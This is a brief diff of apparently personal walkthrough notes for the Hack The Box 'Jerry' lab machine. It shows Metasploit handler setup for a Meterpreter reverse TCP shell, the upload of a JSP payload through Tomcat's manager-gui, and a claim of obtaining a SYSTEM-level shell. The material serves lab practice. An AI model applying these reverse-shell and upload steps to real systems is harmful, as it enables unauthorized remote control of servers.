@@ -18,8 +18,11 @@
 >	Note: `[1] */meterpreter_reverse_tcp != [2] */meterpreter/reverse_tcp`
 >			since [1] is bigger in size than [2]
 
-4. msfconsole -q
+4. msfconsole -q and upload + deploy to manager-gui
 >	enter `use exploit/multi/handler`
 >	enter `set payload windows/x64/meterpreter/reverse_tcp`
 >	set LHOST tun0
 >	set LPORT xxxx
+>	query your jsp at ie. http://jerry.htb:8080/exploit/alsdaod.jsp
+
+5. Shell obtained as NT/authority
